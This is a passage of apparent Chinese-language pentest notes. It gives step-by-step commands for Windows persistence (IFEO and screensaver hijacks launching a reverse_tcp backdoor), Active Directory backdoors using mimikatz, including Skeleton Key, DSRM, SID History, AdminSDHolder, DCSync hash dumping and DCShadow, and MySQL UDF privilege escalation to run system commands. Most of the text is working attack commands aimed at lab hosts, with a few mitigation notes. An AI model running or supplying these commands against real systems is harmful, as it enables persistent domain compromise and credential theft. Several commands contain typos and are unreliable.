<h6 id="2-GlobalFlag"><a href="#2-GlobalFlag" class="headerlink" title="2.GlobalFlag"></a>2.GlobalFlag</h6><p>IFEO还可以指定程序静默退出时启动任意监控程序</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">启用对记事本进程的静默推出监视</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512</span><br><span class="line">启用Windows错误报告进程WarFault.exe，它将成为reverse_tcp.exe的父进程</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1</span><br><span class="line">将监视器设为reverse_tcp.exe</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v MonitorProcess /d &quot;C:\Winodws\System32\reverse_tcp.exe&quot;</span><br></pre></td></tr></table></figure></div>

<p>这样用户打开记事本之后正常运行，但是关闭记事本时将在WerFault.exe进程中创建子进程以运行后门程序reverse_tcp.exe</p>
<h4 id="利用屏幕保护程序"><a href="#利用屏幕保护程序" class="headerlink" title="利用屏幕保护程序"></a>利用屏幕保护程序</h4><p>屏幕保护时Windows的一种功能，保护程序具有.scr扩展文件名组成的可执行文件</p>
<p>位于HKEY_CURRENT_USER\Control Panel\Desktop</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230324084138795.png"
                      alt="image-20230324084138795"
                ></p>
<p>我们就可以通过编辑注册表，修改scrnsave.exe的键的值，即修改路径</p>
<p>实现触发屏幕保护程序，实现后门触发</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">将触发屏幕保护程序时执行的程序自定义为恶意程序，这里可以以.scr或.exe结尾的都可以</span><br><span class="line">reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v SCRNSAVE.EXE /t REG_SZ /d &quot;C:\Users\Marcus reverse_tcp.scr&quot;</span><br><span class="line">启用屏幕保护</span><br><span class="line">reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaveActive /t REG_SZ /d 1</span><br><span class="line">设置不需要密码</span><br><span class="line">reg add &quot;HKEY_CURRENT_USERControl Panel\Desktop&quot; /v ScreenSaverIsSecure /t REG_SZ /d &quot;0&quot;</span><br><span class="line">将用户不活动的超时设为60秒</span><br><span class="line">reg add &quot;HKEY_CURRENT_USER Control Panel、Desktop&quot; /v ScreenSaveTime0ut /t REG_SZ /d &quot;60&quot;</span><br></pre></td></tr></table></figure></div>

<p>这个不需要管理员权限，普通用户即可</p>
<h4 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h4><p>DLL劫持的原理是将同名的恶意DLL文件放在合法的DLL文件所在路径的搜索位置中，当应用程序搜索DLL时，就会用恶意DLL代替合法的DLL来加载。需要管理员权限</p>
<h6 id="1-劫持应用程序"><a href="#1-劫持应用程序" class="headerlink" title="1.劫持应用程序"></a>1.劫持应用程序</h6><h2 id="常见的域后门技术"><a href="#常见的域后门技术" class="headerlink" title="常见的域后门技术"></a>常见的域后门技术</h2><h3 id="创建Skeleton-Key域后门"><a href="#创建Skeleton-Key域后门" class="headerlink" title="创建Skeleton Key域后门"></a>创建Skeleton Key域后门</h3><p>Skeleton Key即万能钥匙，在域控安装这个东西所有的账户都可以用同一个密码，同时原有密码依然有效，但是重启域控之后就失效了</p>
<h6 id="1-常规利用"><a href="#1-常规利用" class="headerlink" title="1.常规利用"></a>1.常规利用</h6><p>通过mimikatz执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;misc::skeleton&quot; exit</span><br></pre></td></tr></table></figure></div>

<p>就可以创建一个Skeleton Key域后门密码为mimikatz</p>
<h6 id="2-缓解措施"><a href="#2-缓解措施" class="headerlink" title="2.缓解措施"></a>2.缓解措施</h6><p>微软对于这个问题在2014年3月添加了一个LSA保护策略，可以执行命令开启关闭LSA</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">开启</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\lSA&quot; /V RunAsPPL /T REG_DWORD /d 1 /f</span><br><span class="line">关闭</span><br><span class="line">reg delete &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v RunAsPPL</span><br></pre></td></tr></table></figure></div>

<p>开启后，mimikatz就会失效，都无法安装SkeletonKey</p>
<p>但是！！</p>
<p>早在2013年10月mimikatz就支持绕过LSA保护。该功能需要mimikatz中的mimidrv.sys文件，命令为</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">           !+</span><br><span class="line">           !processprotect /process:lsass.exe /remove</span><br><span class="line">           misc::sekleton</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230324220115568.png"
                      alt="image-20230324220115568"
                ></p>
<h3 id="创建DSRM域后门"><a href="#创建DSRM域后门" class="headerlink" title="创建DSRM域后门"></a>创建DSRM域后门</h3><p>DSRM时域中的一中安全模式，用于使服务器脱机，进行紧急维护使用，可以后期来修复、还原或重建活动目录数据库</p>
<p>DSRM修改密码指令（NTDSUtil）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">进入NTDSUtil</span><br><span class="line">ntdsutil</span><br><span class="line">进入设置DSRM账户密码设置模式</span><br><span class="line">set dsrm password</span><br><span class="line">在当前的域控制器上恢复DSRM密码</span><br><span class="line">reset passwrod on server null</span><br><span class="line">输入新密码</span><br><span class="line">再次输入密码</span><br><span class="line">退出</span><br><span class="line">q</span><br><span class="line">退出ntdsutil</span><br><span class="line">q</span><br></pre></td></tr></table></figure></div>

<p>注意：仅支持win server 2008以上且需要管理员权限</p>
<p>1.执行</p>
<p><code>mimikatz.exe &quot;privilege::Debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit</code></p>
<p>读取SAM中的DSRM账户的哈希值</p>
<p>2.更改登录模式</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">有以下三种模式</span><br><span class="line">0：只有在域控重启并进入DSRM模式时，才可以使用DSRM管理员账号</span><br><span class="line">1：只有在本地AD、DS停止服务的时候才可以使用DARM账号</span><br><span class="line">2：任何情况下都可以使用DSRM账号</span><br></pre></td></tr></table></figure></div>

<p>执行</p>
<p><code>reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f</code></p>
<p>将模式改为2，允许任何情况下都可以使用DSRM账户</p>
<p>3.kali执行 python3 psexec.py DC-1&#x2F;<a class="link"   href="mailto:&#x41;&#100;&#x6d;&#x69;&#110;&#105;&#x73;&#116;&#114;&#x61;&#116;&#x6f;&#114;&#64;&#49;&#x30;&#x2e;&#49;&#x30;&#x2e;&#x31;&#48;&#x2e;&#49;&#49;" >&#x41;&#100;&#x6d;&#x69;&#110;&#105;&#x73;&#116;&#114;&#x61;&#116;&#x6f;&#114;&#64;&#49;&#x30;&#x2e;&#49;&#x30;&#x2e;&#x31;&#48;&#x2e;&#49;&#49; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> -hashes:cb136a448767792bae25563a498a86e6</p>
<p>即可连接</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325140257148.png"
                      alt="image-20230325140257148"
                ></p>
<h3 id="SID-History的利用"><a href="#SID-History的利用" class="headerlink" title="SID History的利用"></a>SID History的利用</h3><p>在Windows中，SID是指安全标识符，是用户、用户组或其他安全主题的唯一、不可变的标识符</p>
<p>Windows根据ACL也就是访问控制列表授予或拒绝对资源的访问和特权，ACL使用SID来识别用户身份</p>
<p>如果一个账户被删除，重新建立一个相同名字的账户，其权限不会是前一个账户的权限，因为SID是不一样的</p>
<p>SID History是一个支持域迁移方案的属性，使得账户的访问权限能有效克隆，原理就是克隆SID</p>
<h6 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h6><p>思路：可以将域管理员的SID添加到其他域用户的SID History属性中，以此建立一个隐藏的域后门，需要域管理员权限</p>
<p>1.创建一个nihao用户进行演示</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325144331155.png"
                      alt="image-20230325144331155"
                ></p>
<p>2.上传mimikatz执行命令，并且将域管理员的SID添加到Hacker的SID History属性中</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz&gt;2.1.0</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sid::patch&quot; &quot;sid::add /sam:nihao /new:Administrator&quot; exit</span><br><span class="line">&lt;2.1.0</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;misc:addsid Hacker ADSAdministrator&quot; exit</span><br></pre></td></tr></table></figure></div>

<p>3.通过powerhell查看nihao用户的属性</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">Get-ADUser nihao -Properties SIDHistory</span><br></pre></td></tr></table></figure></div>

<p>发现SID History属性值已经和域管理员账户的SID相同，说明已经继承了域管理员的权限</p>
<p>4.通过nihao用户连接</p>
<p>kali      python3 wmiexec.py HACK-MY&#x2F;nihao:nihao\Admin!@#<a class="link"   href="mailto:&#52;&#x35;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#56;&#49;&#x2e;&#49;&#x34;&#x30;" >&#52;&#x35;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#56;&#49;&#x2e;&#49;&#x34;&#x30; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="利用AdminSDHolder打造域后门"><a href="#利用AdminSDHolder打造域后门" class="headerlink" title="利用AdminSDHolder打造域后门"></a>利用AdminSDHolder打造域后门</h3><p>AdminSDHolder是一个特殊的AD容器对象，位于Domain NC的system容器下</p>
<p>一般作为某些受保护对象的安全模板，防止这些对象遭受恶意的修改或者滥用</p>
<p>受保护对象通常包括特权用户和受保护的组，Administrator、Domain Admins、Enterprise Admin以及Schema Admins等</p>
<p>在活动目录中用adminCount用来标记特权用户和组，通常特权用户和组属性被设为1</p>
<p>通过AdFind查询adminCount属性设置为1的对象，可以找到所有受AdminSDHolder保护的特权和组</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">列举受保护的用户</span><br><span class="line">Adfind.exe -b &quot;de=hack-my,dc=com&quot; -f &quot;&amp;(objectcategory=person)(samaccountname=*)(admincount=1)&quot; -dn</span><br><span class="line">列举搜保护的组</span><br><span class="line">Adfind.exe -b &quot;de=hack-my,dc=com&quot; -f &quot;&amp;(objectcategory=group)(admincount=1)&quot; -dn</span><br></pre></td></tr></table></figure></div>

<p>默认下，系统会定期检查（60分钟）受保护对象的安全描述符，将受保护对的ACL和AdminSDHolder的ACL相比较，如果不一致将会强制修改为AdminSDHolder的ACL（通过SDProp进程来完成检查）</p>
<h6 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h6><p>思路：可以篡改AdminADHolder的ACL配置，然后60分钟后SDPorp调用将会强制改变受保护对象的ACL，以此建立一个隐蔽的后门，需要域管理员权限</p>
<p>执行命令，通过powerView向AdminSDHolder容器添加一个ACL，使普通的域用户拥有对AdminSDHolder的完全控制权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">Add-DomainObjectAcl -TargetSearchBase &quot;LDAP://CN=AdminSDHolder,CN=System,DC=hack-my,DC=com&quot; -PrincipalIdentity Marcus -Rights All -Verbose</span><br></pre></td></tr></table></figure></div>

<p>等60分钟让SDProp生效，也可以用指令使其时间缩短，这个时候Marcus用户就可以向Domain Admins等关键用户组成员添加成员</p>
<p>清除这个权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Remove-DomainObjectAcl -TargetSearchBase &quot;LDAP://CN=AdminSDHolder,CN=System,DC=hack-my,DC=com&quot; -PrincipalIdentity Marcus -Rights All -Verbose</span><br></pre></td></tr></table></figure></div>

<h3 id="HOOK-PasswordChangeNotify"><a href="#HOOK-PasswordChangeNotify" class="headerlink" title="HOOK PasswordChangeNotify"></a>HOOK PasswordChangeNotify</h3><p>PasswordChangeNotify这个东西是windows中为了重置密码，windows会检查新密码的复杂性是否够安全，如果符合要求LSA就会调用它在系统中同步密码</p>
<p>调用的过程中密码是明文传输，所以可以利用KOOK技术在调用过程中劫持密码</p>
<h2 id="DCSync技术"><a href="#DCSync技术" class="headerlink" title="DCSync技术"></a>DCSync技术</h2><h3 id="利用DCSync导出域内hash"><a href="#利用DCSync导出域内hash" class="headerlink" title="利用DCSync导出域内hash"></a>利用DCSync导出域内hash</h3><p>在一个域环境中可以有多台域控，每台域控各自存储着一份所在域的活动目录的可写副本</p>
<p>对目录的任何修改都可以从源域控中同步到其他域控中</p>
<p>当一个域控想从其他域控获取数据时，客户端域控会向服务端域控获取DSGetNCChanges请求，这个请求的响应包含着更新</p>
<p>一般15分钟会有一次域同步</p>
<p>DCSync就是利用域控同步原理，通过Directory Replication Service服务的IDL——DRSGetNCChanges接口向域控发起请求</p>
<p>可以在域内任何一台机器上模拟一个域控制器，通过域数据同步复制的方式获取正在运行的合法域控的数据</p>
<p>注意：此攻击并不适用于只读域控（RODC）</p>
<h4 id="mimikatz下的利用"><a href="#mimikatz下的利用" class="headerlink" title="mimikatz下的利用"></a>mimikatz下的利用</h4><p>mimikatz在2015年8月更新中添加了DCSync功能</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">导出域内指定用户的信息，包括hash</span><br><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /user:hack-my\administrator&quot; exit</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325162902673.png"
                      alt="image-20230325162902673"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">导出域内所有用户的信息，包括hash</span><br><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /all&quot; exit</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325163104824.png"
                      alt="image-20230325163104824"
                ></p>
<p><code>mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /all /csv&quot; exit</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325163210977.png"
                      alt="image-20230325163210977"
                ></p>
<h4 id="Impacket下的利用"><a href="#Impacket下的利用" class="headerlink" title="Impacket下的利用"></a>Impacket下的利用</h4><p>Impacket中的secretsdump.py可以支持DCSync技术导出域控中的用户哈希</p>
<p>该工具可以使用高权限用户的密码来实现从域外主机读取域内主机的hash值，同时可以通过Dcsync或卷影复制的方法，NTDS.dit的中导出所有用户的hash值</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python secretsdump.py hack-my.com/administrator(账号):Admin!@#45(密码)@192.168.81.140(域控IP) -just-dc-user &quot;hack-my\administrator&quot;</span><br></pre></td></tr></table></figure></div>

<p>导出域管理员Administrator用户的hash值</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325165120864.png"
                      alt="image-20230325165120864"
                ></p>
<h3 id="利用DCSync维持域内权限"><a href="#利用DCSync维持域内权限" class="headerlink" title="利用DCSync维持域内权限"></a>利用DCSync维持域内权限</h3><p>在获取域管理员权限之后，可以手动为域内标准用户赋予DCSync操作权限，从而实现隐蔽发域后门</p>
<p>通过powershell中的PowerView.ps1脚本实现</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">为域用户Alice添加DCSync权限</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC=hack-my,DC=com&quot; -PrincipalIdentity Alice -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure></div>

<p>添加成功后可以通过Alice用户导出域内用户的哈希</p>
<p><code>python3 secretsdump.py hack-my.com/administrator:Admin\!\@\#45@192.168.81.141 -just-dc-user &quot;hack-my\administrator&quot;</code></p>
<p>清除权限</p>
<p><code>Remove-DomainObjectAcl -TargetIdentity &quot;DC=hack-my,DC=com&quot; -PrincipalIdentity Alice -Rights DCSync -Verbose</code></p>
<h3 id="DCShadow"><a href="#DCShadow" class="headerlink" title="DCShadow"></a>DCShadow</h3><p>DCShadow技术同样利用了域控之间的DRS数据同步</p>
<p>但是它与DCSync思路相反</p>
<p>它是利用创建一个恶意的域控，利用域控之间的同步复制，将预先设定的对象和对象属性注入正在运行的合法域控中，以此来创建域后门等</p>
<p>通过DCShadow修改普通域用户Alice来演示攻击原理</p>
<p>前文已经知道，将用户的primaryGroupID改为512，可以然用户成为域管理员</p>
<p>RID是指相对标识符，时SID的一部分，通常在SID字符串的末端。</p>
<p>windows使用SID来区分用户账户和组的</p>
<h6 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h6><p>1.在任意注意中运行mimkatz并执行以下命令，创建恶意域控</p>
<p><code>mimikatz.exe &quot;lsadump::dcshadow /object:CN=Alice,CN=Users,DC=hack-my,DC=com /attribute:primaryGroupID /value:512&quot; exit</code></p>
<p>2.第一个命令窗口不要关，重新打开一个，强制触发域复制，将数据更改推送至合法域控制器</p>
<p><code>mimikatz.exe &quot;lsadump::dcshadow /push&quot; exit</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325173750046.png"
                      alt="image-20230325173750046"
                ></p>
<p> 按理来说这时候Alice已经是域管理员组的用户了，但不知道为啥我成功不了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325175329381.png"
                      alt="image-20230325175329381"
                ></p>
<p>DCShadow使得测试人员可以直接修改活动目录数据库中的对象</p>
<p>域防护比较严的情况下，可以利用DCShadow操控SID History、Krbtgt账户的密码，或者将用户添加到特权组，实现域权限持久化</p>
]]></content>
  </entry>
  <entry>
    <title>数据库提权</title>
    <url>/2023/05/15/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h2 id="MySQL数据库提权"><a href="#MySQL数据库提权" class="headerlink" title="MySQL数据库提权"></a>MySQL数据库提权</h2><p>主要是要通过mysql权限——&gt;进而获得操作系统权限</p>
<h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>UDF 全称user defined function 又叫 用户自定义函数，是通过添加新函数，实现mysql中无法通过函数实现功能的拓展，就比如MySQL没有这个函数，我们可以自己添加进去，然后就可以用我们自己添加的函数了</p>
<h4 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h4><p>我们需要知道mysql数据库的用户名和密码，并且可以远程登录（相当于获得了MySQL数据库权限）</p>
<p>mysql具有写入文件的权限：就是secure_file_priv的值为空</p>
<p>但是在这些操作之前需要知道，一般MySQL数据库只允许本地登入，虽然在知道账号密码的情况下我们可以通过navicat连接，但是如果只能本地连接的话就要去获得高权限来获得rdp远程连接的权限</p>
<p>我们可以通过更改mysql配置文件来开启远程登陆</p>
<p>在mysql目录下&#x2F;etc&#x2F;mysql&#x2F;my.conf文件，将bind-address&#x3D;127.0.0.1改成0.0.0.0</p>
<p>但是还有账号限制，需要给远程登陆用户赋予权限，首先可以创建一个admin&#x2F;123456用户，使用%来允许任意IP登陆</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">grant all on *.* to admin@&#x27;%&#x27; identified by &#x27;123456&#x27; with grant option;</span><br></pre></td></tr></table></figure></div>



<p>另外：mysql提权后获得的最大权限是和服务器登入的账号有关的，如果是普通账号登入的话最大权限也只能是普通账户权限，如果是管理员登入的话，提权后就是系统管理员权限</p>
<h4 id="手动提权"><a href="#手动提权" class="headerlink" title="手动提权"></a>手动提权</h4><p>先查看MySQL是否具有写入文件的权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure></div>

<p>secure_file_priv是用来限制load、dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限</p>
<p>secure_file_priv值为null 表示不允许导入导出</p>
<p>secure_file_priv值为&#x2F;tmp&#x2F;，表示限制导入，导出只能在&#x2F;tmp&#x2F;目录下</p>
<p>secure_file_priv值为空，则不限制</p>
<p>这个表示不允许导入导出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417200508085.png"
                      alt="image-20230417200508085"
                ></p>
<p>这个表示不做任何限制</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417200538917.png"
                      alt="image-20230417200538917"
                ></p>
<p>如何更改，在mysql目录中my.ini在最后添加一行<code>secure_file_priv=&#39;&#39;</code>即可，重启apache服务即可</p>
<p>接下来我们就要上传UDF动态链接库文件</p>
<p>所谓的动态链接库文件就是一种实现共享函数库的一种方式，在Windows环境下后缀名为.dll，linux环境就是.so，文件包含执行系统命令的一些函数</p>
<p>那这个文件在哪？？？？</p>
<p>这个文件在sqlmap、msf中都有的其实</p>
<p>具体目录在\sqlmap\data\udf\mysql里面有linux和windows的32位、64位版本，我们需要知道数据库服务器用哪个版本系统，执行以下命令查询</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@version_compile_os, @@version_compile_machine;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417203102013.png"
                      alt="image-20230417203102013"
                ></p>
<p>我这个是Windows64位的所以就上传Windows 64位的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417203205586.png"
                      alt="image-20230417203205586"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417203254751.png"
                      alt="image-20230417203254751"
                ></p>
<p>可以看出，这里的文件是.dll_结尾的，这是由于sqlmap为了防止被误杀经过了编码处理，不能别直接使用，需要解码，在sqlmap自带解码py脚本在\sqlmap\extra\cloak下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417203537255.png"
                      alt="image-20230417203537255"
                ></p>
<p>执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 cloak.py -d -i lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll</span><br></pre></td></tr></table></figure></div>

<p>即可</p>
<p>解码后的文件就恶意上传了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417204509877.png"
                      alt="image-20230417204509877"
                ></p>
<p>Mysql版本小于5.1：<br>如果是 win 2000 的服务器，我们则需要将 udf.dll 文件导到 C:\Winnt\udf.dll 下。<br>如果是 win2003 服务器，我们则要将 udf.dll 文件导出在 C:\Windows\udf.dll 下。</p>
<p>这里说一下为什么一定要是system32目录下。因为在MYSQL5之后，对DLL注册做了限制，所对应的DLL不能包含’&#x2F;‘或者’’，也就是说不能是绝对路径，所以这里我们放到system32系统环境变量中直接调用，可以规避这个限制</p>
<p>Mysql版本大于5.1，udf.dll文件必须放在MySQL安装目录的lib\plugin文件夹下。（plugin文件夹默认不存在，需要创建）。</p>
<p>我们的数据库版本大于5.1需要创建一个plugin文件夹，但是我们只是获得mysql权限，怎么在他的系统下创建文件夹</p>
<p>可以利用NTFS流进行创建</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;xxx&#x27; into dumpfile &#x27;E:\phpstudy\phpstudy_pro\Extensions\MySQL5.7.26\lib\plugin::$INDEX_ALLOCATION&#x27;;</span><br></pre></td></tr></table></figure></div>

<p>但是报错了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417205832997.png"
                      alt="image-20230417205832997"
                ></p>
<p>自己创一个吧……..</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;plugin%&#x27;;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417210024594.png"
                      alt="image-20230417210024594"
                ></p>
<p>然后就可以将刚才的.dll文件放到plugin里面了</p>
<p>执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select hex(load_file(&#x27;C:\\Windows\\System32\\cmd.exe\\lib_mysqludf_sys_64.dll&#x27;)) into dumpfile &#x27;E:\\phpstudy\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin&#x27;;</span><br><span class="line"></span><br><span class="line">这里windows下目录结构要进行转义双写</span><br></pre></td></tr></table></figure></div>

<p>不行！！！直接拖进去吧，唉~~</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417211718980.png"
                      alt="image-20230417211718980"
                ></p>
<p>那个方法说是可能传输不全可以用十六进制来</p>
<p>那个代码网站贴这了</p>
<p><a class="link"   href="https://www.sqlsec.com/tools/udf.html" >https://www.sqlsec.com/tools/udf.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>上传之后执行以下指令，创建自定义函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417211838441.png"
                      alt="image-20230417211838441"
                ></p>
<p>查看是否创建成功</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from mysql.func;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417211910126.png"
                      alt="image-20230417211910126"
                ></p>
<p>然后就可以执行这个函数，用来执行系统命令了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417212016180.png"
                      alt="image-20230417212016180"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#x27;ipconfig&#x27;);</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230417212029883.png"
                      alt="image-20230417212029883"
                ></p>
<p>攻击者可以利用生成的dl文件提供的函数执行系统命令。</p>
<p>sys_eval，执行任意命令，并将输出返回。</p>
<p>sys_exec，执行任意命令，并将退出码返回。</p>
<p>sys_get，获取一个环境变量。</p>
<p>sys_set，创建或修改一个环境变量。</p>
<p>全部流程就这样结束了</p>
<p>总结以下：</p>
